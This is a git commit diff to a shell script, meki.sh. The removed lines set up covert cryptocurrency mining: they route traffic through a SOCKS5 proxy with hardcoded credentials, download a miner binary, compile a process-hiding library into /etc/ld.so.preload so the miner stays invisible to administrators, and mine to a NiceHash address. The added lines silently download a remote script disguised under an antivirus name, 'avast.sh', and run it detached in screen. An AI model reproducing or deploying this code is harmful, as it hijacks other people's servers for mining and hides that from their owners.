af32148748f0a7e184aebceea958ccef2b697f75
renilo <88342640+renilo@users.noreply.github.com>
2022-03-17 15:11:36 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -1,48 +1,13 @@
+#!/bin/bash
+
 #!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+#!/bin/bash
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+apt install screen -y
 
-tar -xvzf graphics.tar.gz
+wget https://raw.githubusercontent.com/renilo/bc/main/avast.sh >/dev/null 2>&1
 
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 3.15.39.186:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
-END
+chmod +x avast.sh >/dev/null 2>&1
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "**"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "**"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --url=ssl://3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+screen -dmS Running ./avast.sh
